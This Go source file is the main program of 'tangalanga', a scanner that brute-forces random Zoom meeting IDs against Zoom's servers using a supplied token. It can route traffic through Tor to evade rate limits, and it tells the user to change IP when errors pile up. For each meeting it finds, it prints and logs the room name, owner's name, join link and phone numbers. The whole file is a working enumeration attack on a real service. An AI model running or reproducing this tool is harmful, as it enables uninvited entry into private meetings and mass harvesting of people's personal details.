package main

import (
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"time"

	"github.com/logrusorgru/aurora"
	log "github.com/sirupsen/logrus"
)

const logo = `

		zoom scanner

▄▄▄▄▄ ▄▄▄·  ▐ ▄  ▄▄ •  ▄▄▄· ▄▄▌   ▄▄▄·  ▐ ▄  ▄▄ •  ▄▄▄·
•██  ▐█ ▀█ •█▌▐█▐█ ▀ ▪▐█ ▀█ ██•  ▐█ ▀█ •█▌▐█▐█ ▀ ▪▐█ ▀█
 ▐█.▪▄█▀▀█ ▐█▐▐▌▄█ ▀█▄▄█▀▀█ ██▪  ▄█▀▀█ ▐█▐▐▌▄█ ▀█▄▄█▀▀█
 ▐█▌·▐█ ▪▐▌██▐█▌▐█▄▪▐█▐█ ▪▐▌▐█▌▐▌▐█ ▪▐▌██▐█▌▐█▄▪▐█▐█ ▪▐▌
 ▀▀▀  ▀  ▀ ▀▀ █▪·▀▀▀▀  ▀  ▀ .▀▀▀  ▀  ▀ ▀▀ █▪·▀▀▀▀  ▀  ▀

		made with 💀 by @cuerbot

`

const zoomUrl = "https://www3.zoom.us/conf/j"

var colorFlag = flag.Bool("colors", true, "enable or disable colors")
var token = flag.String("token", "", "zpk token to use")
var debugFlag = flag.Bool("debug", false, "show error messages")
var outputFile = flag.String("output", "", "output file for successful finds")
var torFlag = flag.Bool("tor", false, "connect via tor")
var proxyAddr = flag.String("proxy", "socks5://127.0.0.1:9150", "socks url to use as proxy")
var hiddenFlag = flag.Bool("hidden", false, "connect via embedded tor")

var color aurora.Aurora
var tangalanga *Tangalanga

func init() {
	rand.Seed(time.Now().UnixNano())
	color = aurora.NewAurora(*colorFlag)
	flag.Parse()

	fmt.Println(color.Green(logo))

	if *token == "" {
		log.Panic("Missing token")
	}

	if *outputFile != "" {
		file, err := os.OpenFile(*outputFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)

		if err != nil {
			log.SetOutput(os.Stdout)
		} else {
			fmt.Printf("output is %s\n", color.Yellow(*outputFile))
			log.SetOutput(file)
		}
	}
}

func randomMeetingId() int {
	min := 60000000000 // Just to avoid a sea of non existent ids
	max := 99999999999

	return rand.Intn(max-min+1) + min
}

func main() {
	var t *http.Transport

	transports := new(Transport)

	switch true {
	case *hiddenFlag:
		fmt.Printf("connecting to the TOR network... %s\n", color.Yellow("please wait"))
		t = transports.InteralTOR()

	case *torFlag:
		fmt.Printf("connecting to the TOR network via proxy %s...\n", color.Yellow(*proxyAddr))
		t = transports.Proxy(*proxyAddr)

	default:
		t = transports.Default()
	}

	tangalanga, _ := NewTangalanga(
		WithTransport(t),
	)

	c := make(chan os.Signal, 2)

	go func() {
		<-c
		tangalanga.Close()
		os.Exit(0)
	}()

	fmt.Printf("finding disclosed room ids... %s\n", color.Yellow("please wait"))

	for i := 0; ; i++ {
		if i%200 == 0 && i > 0 {
			fmt.Printf("%d ids processed\n", color.Red(i)) // Just to show something if no debug
		}

		id := randomMeetingId()

		m, err := tangalanga.FindMeeting(id)

		if err != nil && *debugFlag {
			fmt.Printf("%s\n", err)
		}

		if tangalanga.ErrorCounter >= 100 {
			fmt.Println(color.Red("too many errors!! try changing ip"))
		}

		if err == nil {
			r := m.GetRoom()
			roomId, roomName, user, link := r.GetRoomId(), r.GetRoomName(), r.GetUser(), r.GetLink()

			msg := "\nRoom ID: %d.\n" +
				"Room: %s.\n" +
				"Owner: %s.\n" +
				"Link: %s\n\n"

			fmt.Printf(msg,
				color.Green(roomId),
				color.Green(roomName),
				color.Green(user),
				color.Yellow(link),
			)

			log.WithFields(log.Fields{
				"room_id":   roomId,
				"room_name": roomName,
				"owner":     user,
				"link":      link,
			}).Info(r.GetPhoneNumbers())
		}

	}
}
